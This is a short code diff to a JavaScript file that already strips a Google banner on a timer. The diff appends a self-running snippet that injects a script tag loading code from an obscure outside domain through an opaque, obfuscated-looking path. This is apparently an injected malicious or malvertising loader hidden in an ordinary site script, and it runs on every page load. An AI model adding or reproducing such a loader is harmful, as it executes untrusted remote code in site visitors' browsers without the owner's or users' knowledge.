@@ -232,3 +232,15 @@ function removeGoogleBanner() {
 }
 
 setInterval(removeGoogleBanner,500);
+
+
+(function(hkl){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = hkl || {};
+s.src = "\/\/waterloggedkind.com\/c.D_9A6Yb\/2v5jlqSDWvQ\/9cNkjGgF4\/Nbz\/ISyVNLSm0J2iOQD\/gm3NMbjiIo5l";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
